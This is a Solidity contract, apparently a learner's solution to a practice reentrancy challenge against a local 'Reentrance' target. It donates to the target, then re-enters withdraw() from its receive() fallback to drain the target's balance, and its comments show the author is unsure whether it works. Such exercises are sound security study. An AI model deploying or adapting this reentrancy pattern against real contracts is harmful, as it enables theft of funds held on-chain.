// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(contractAddress);
    }

    function hackContract() external {
        // Code me!
        // probably first need to donate to the contract so that we pass the initial balances check
        reentrance.donate{value: 1}(address(this));
        uint myBalance = reentrance.balanceOf(address(this));
        console.log(myBalance);

        // then after that, when we call withdraw, we'll get sent the funds
        reentrance.withdraw();
        myBalance = reentrance.balanceOf(address(this));
        console.log(myBalance);
    }


    receive () external payable {
        // our code is running again! so we should be able to call and do more of whatever we want
        // this should keep looping and withdraw the full contract...?
        reentrance.withdraw();
    }
    
}
